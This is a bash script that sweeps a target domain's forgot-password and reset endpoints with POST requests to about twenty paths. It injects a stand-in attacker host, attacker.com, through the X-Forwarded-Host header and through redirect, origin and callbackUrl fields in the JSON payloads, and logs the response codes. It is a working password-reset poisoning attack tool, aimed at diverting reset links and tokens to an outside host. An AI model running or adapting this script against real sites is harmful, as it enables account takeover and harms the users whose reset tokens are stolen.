#!/bin/bash
# Forgot-password chain test - hits many endpoints on both domains
# Args: $1=domain $2=mailbox $3=outfile_label
set -u
D="$1"
M="$2"
LBL="$3"
OUT=/home/shenyo1/.local/opt/kobra/wibuku_forgot_1785107600
ATTACKER="https://attacker.com"

PATHS=(
  "/forgot" "/password/forgot" "/reset-password" "/forgot-password"
  "/auth/forgot" "/api/auth/forgot" "/api/v1/auth/forgot"
  "/api/v1/auth/reset" "/api/v1/auth/password"
  "/api/v1/auth/recover" "/api/auth/recover"
  "/api/v1/auth/change-password" "/api/auth/change-password"
  "/api/users/password" "/api/password/forgot" "/api/user/forgot"
  "/api/v1/users/forgot" "/api/v1/user/forgot" "/api/v1/users/password"
  "/api/v1/password/reset" "/api/v1/reset-password" "/api/auth/reset"
)

PAYLOADS=(
  "{\"email\":\"$M\"}"
  "{\"email\":\"$M\",\"redirect\":\"$ATTACKER\"}"
  "{\"email\":\"$M\",\"origin\":\"$ATTACKER\"}"
  "{\"email\":\"$M\",\"callbackUrl\":\"$ATTACKER\"}"
)

mkdir -p "$OUT/$LBL"
echo "=== TARGET: https://$D ===" | tee "$OUT/$LBL/summary.txt"
echo "=== Mailbox: $M ===" | tee -a "$OUT/$LBL/summary.txt"
echo "" | tee -a "$OUT/$LBL/summary.txt"

for p in "${PATHS[@]}"; do
  for i in 0 1 2 3; do
    pl="${PAYLOADS[$i]}"
    LBL_PAY="p${i}"
    f="$OUT/$LBL/$(echo $p | tr '/' '_')${LBL_PAY}.txt"
    code=$(curl -sS -o "$f.body" -w "%{http_code}|%{size_download}|%{time_total}" \
      -X POST "https://$D$p" \
      -H "Content-Type: application/json" \
      -H "Origin: https://$D" \
      -H "Referer: https://$D/" \
      -H "X-Forwarded-Host: attacker.com" \
      -H "X-Forwarded-Proto: https" \
      -d "$pl" 2>&1)
    echo "$p  $LBL_PAY  -> $code" | tee -a "$OUT/$LBL/summary.txt"
  done
done

echo "=== Done $D ===" | tee -a "$OUT/$LBL/summary.txt"
